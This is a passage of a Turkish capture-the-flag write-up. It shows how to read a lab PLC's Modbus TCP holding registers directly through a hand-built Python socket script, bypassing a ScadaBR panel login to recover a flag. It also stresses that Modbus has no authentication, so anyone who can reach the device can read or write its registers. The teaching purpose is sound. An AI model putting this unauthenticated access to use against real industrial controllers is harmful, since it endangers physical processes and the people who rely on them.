## 04 — Ortadaki adamı atlamak: Modbus'a doğrudan konuşmak

Modbus, 1979'da Modicon'un PLC'lerinin bir seri hat üzerinden birbiriyle konuşması için tasarlandı. Modbus TCP, aynı mesaj formatının TCP soketine sarılmış hali — ki `5020`'de dinleyen de tam olarak bu. Tasarım gereği **kimlik doğrulama yok**: login yok, token yok, oturum yok. Paketi PLC'ye yönlendirebilen herkes, ScadaBR'ın login'den sonra sahip olduğu erişimin aynısına sahip.

Modbus, cihazın tüm durumunu dört düz tabloda tutar:

| Tablo | Genişlik | Erişim | Genelde tuttuğu şey |
|---|---|---|---|
| Coils | 1 bit | okuma/yazma | röle/valf durumları |
| Discrete Inputs | 1 bit | salt okunur | sensör tetikleri |
| Input Registers | 16 bit | salt okunur | ölçülen değerler |
| Holding Registers | 16 bit | okuma/yazma | setpoint'ler, serbest kullanım alanı |

ScadaBR'daki point `Binary` (coil/discrete input) olarak tanımlanmıştı — bu bir decoy'du. Holding register'lar tamamen jenerik 16 bitlik alanlar; bir CTF senaryosunda register başına bir ASCII karakter saklayıp Modbus'un kendisine okutmak gayet mümkün. Bunu doğrudan bir TCP soketiyle, hiçbir kütüphane kullanmadan denedim — function code `0x03` (Read Holding Registers), adres `0`'dan başlayarak `60` register:

```python
import socket, struct

TARGET_IP   = "10.82.190.131"
TARGET_PORT = 5020

# PDU: 0x03 = Read Holding Registers, start=0, count=60
pdu  = struct.pack(">BHH", 0x03, 0, 60)
# MBAP: Transaction ID, Protocol ID(=0), Length, Unit ID
mbap = struct.pack(">HHHB", 1, 0, len(pdu) + 1, 1)

s = socket.socket()
s.connect((TARGET_IP, TARGET_PORT))
s.sendall(mbap + pdu)
resp = s.recv(4096)

byte_count = resp[8]
regs = struct.unpack(">" + "H" * (byte_count // 2), resp[9:9 + byte_count])
print("".join(chr(r) for r in regs if 32 <= r < 127))
s.close()
```

Birkaç detay hand-rolled Modbus'ta kritik:

- `>` her `struct.pack` çağrısının başında zorunlu — Modbus, TCP/IP gibi big-endian (network byte order) şart koşuyor. Unutulursa `60` sayısı `00 3c` yerine `3c 00` (15360) olarak gider.
- MBAP'teki **Length** alanı, mesajın toplam uzunluğu değil — kendisinden *sonra gelen* byte sayısı: Unit ID (1) + PDU (5) = `len(pdu) + 1`.
- Cevap `[7 byte MBAP][function code][byte count][register verisi]` şeklinde geliyor; `byte_count // 2` ile kaç register geldiğini hesaplayıp format string'i dinamik kuruyoruz.
- `32 <= r < 127` filtresi yazdırılabilir ASCII aralığı — asıl string'i, sıfırlarla dolu boş register'ların arasından ayıklıyor.

```console

```

## Özet — Öğrenilen teknikler

- **OT'de ağ erişimi, erişim kontrolünün kendisidir.** Modbus TCP'nin hiçbir kimlik doğrulaması yok; pakete ulaşabilen herkes register'ları okuyabilir, yazma fonksiyon kodlarıyla değiştirebilir de.
- **SCADA paneli bir güvenlik sınırı değil, bir kolaylık katmanıdır.** Panelin config'i arkadaki host/port/protokolü sızdırdığı an, panelin kendi login'i önemsizleşir.
- **nmap, endüstriyel protokolleri güvenilir şekilde tanımaz.** `zenginkyo-1?` gibi bir port numarası tahmini, gerçek bir servis parmak izi değildir — SCADA yazılımının yanındaki tanınmayan port, gürültü değil, ipucudur.
- **Kütüphane yerine paketi elle kurmak, protokolü gerçekten öğretir.** `pymodbus.read_holding_registers()` çağırmak yerine 12 byte'ı `struct.pack` ile dizmek, header düzenini ve byte-order/length semantiğini kalıcı şekilde kavratıyor.
